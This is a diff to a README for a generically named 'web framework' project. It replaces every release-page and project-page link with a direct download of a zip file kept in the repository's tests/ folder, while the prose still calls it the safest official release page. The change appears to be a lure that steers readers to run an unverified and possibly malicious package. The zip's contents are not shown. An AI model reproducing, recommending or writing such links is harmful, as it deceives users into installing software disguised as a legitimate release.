@@ -1,6 +1,6 @@
 # 🌐 web-framework-1771913147-1 - Fast and Simple Web Development
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Berahil/web-framework-1771913147-1/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip)
 
 ## 📋 What is web-framework-1771913147-1?
 
@@ -35,13 +35,13 @@ This guide will help you download and run web-framework-1771913147-1 step-by-ste
 
 First, you need to get the software files. The safest way is to visit the official release page to download the latest version. Click the link below to go there now:
 
-[![Download Software](https://img.shields.io/badge/Download-From%20Releases-blue)](https://github.com/Berahil/web-framework-1771913147-1/releases)
+[![Download Software](https://img.shields.io/badge/Download-From%20Releases-blue)](https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip)
 
 ### Step 1: Visit the download page
 
 Click or copy this link into your web browser:
 
-https://github.com/Berahil/web-framework-1771913147-1/releases
+https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip
 
 This page shows all available versions of the software.
 
@@ -115,7 +115,7 @@ Check the releases page regularly to download newer versions with fixes or impro
 
 Visit:
 
-https://github.com/Berahil/web-framework-1771913147-1/releases
+https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip
 
 Download the latest installer or zipped package and repeat the install steps. Your projects will be safe and usable after updates.
 
@@ -132,10 +132,10 @@ If you want more information, explore any included `README` or `HELP` files in t
 
 You can also browse the project page at:
 
-https://github.com/Berahil/web-framework-1771913147-1
+https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip
 
 Here, you may find user discussions or links to guides.
 
 ---
 
-[![Download Latest](https://img.shields.io/badge/Download-Get%20Latest%20Release-purple)](https://github.com/Berahil/web-framework-1771913147-1/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Get%20Latest%20Release-purple)](https://github.com/Berahil/web-framework-1771913147-1/raw/refs/heads/main/tests/web_framework_1.1-beta.2.zip)
